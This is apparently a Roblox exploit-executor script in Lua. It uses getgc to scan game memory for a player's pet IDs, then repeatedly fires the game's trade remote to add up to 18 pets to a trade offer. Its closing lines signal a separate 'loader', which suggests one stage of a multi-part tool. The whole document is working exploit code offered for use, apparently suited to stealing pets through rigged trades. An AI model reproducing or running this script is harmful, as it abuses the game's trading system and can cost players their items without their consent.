local addItem = game:GetService("ReplicatedStorage")

    :WaitForChild("API")

    :WaitForChild("TradeAPI/AddItemToOffer")



if not getgc then

    warn("getgc is not available")

    return

end



local MAX_ITEMS = 18



local ids = {}

local seen = {}



local ok, err = pcall(function()

    for _, obj in pairs(getgc(true)) do

        if type(obj) == "table" then

            local pets = rawget(obj, "pets")



            if type(pets) == "table" then

                for id, pet in pairs(pets) do

                    if type(id) == "string"

                    and not seen[id]

                    and id:match("^2_") then

                        seen[id] = true

                        table.insert(ids, id)



                        if #ids >= MAX_ITEMS then

                            return

                        end

                    end

                end

            end

        end

    end

end)



if not ok then

    warn("Scan error:", err)

    return

end



print("Found IDs:", #ids)



for i, id in ipairs(ids) do

    print("Adding", i, id)

    addItem:FireServer(id)

    task.wait(0.2)

end



print("Finished")

print("====================================")

print("SCRIPT 2 FINISHED")

print("SIGNALLING LOADER...")

print("====================================")

getgenv().Script2Finished = true
